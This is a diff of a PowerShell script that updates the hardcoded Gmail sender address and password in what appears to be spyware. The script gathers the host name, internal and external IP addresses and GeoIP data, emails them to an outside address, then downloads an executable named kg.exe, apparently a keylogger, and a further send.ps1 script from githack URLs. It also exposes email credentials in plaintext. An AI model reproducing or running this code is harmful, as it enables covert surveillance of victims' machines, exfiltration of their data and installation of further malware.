@@ -22,13 +22,13 @@ if( -Not (Test-Path $pwd\fingerprint) ){
     $Fingerprint >> $pwd/fingerprint
     $Body = "Computer name is $Hostname`n`n*******************`n`nLocal Area Network Configuration`n`n$InternalIP`n`n*******************`n`nInternet Facing IP address`n`n$ExternalIP`n`n*******************`n`nGeoIP information From External IP address`n`n$GeoIP`n`n*******************`n`nAnd The Computer will be identified with the id $Fingerprint"
     $EmailTo = "commnc@krutt.org"
-    $EmailFrom = "templeynonso@gmail.com"
+    $EmailFrom = "elbethender@gmail.com"
     $Subject = "New Host Report" 
     $SMTPServer = "smtp.gmail.com" 
     $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
     $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
     $SMTPClient.EnableSsl = $true 
-    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("templeynonso@gmail.com", "oguezuonu"); 
+    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("elbethender@gmail.com", "homernomer"); 
     $SMTPClient.Send($SMTPMessage)
     $browser.DownloadFile( "https://rawcdn.githack.com/commnc/sources/f1c5bfa6094e71c5165fcccfc07710887c100e91/kg.exe" , "$pwd\kg.exe" )
     $browser.DownloadFile( "https://raw.githack.com/commnc/sources/master/send.ps1" , "$pwd\send.ps1" )
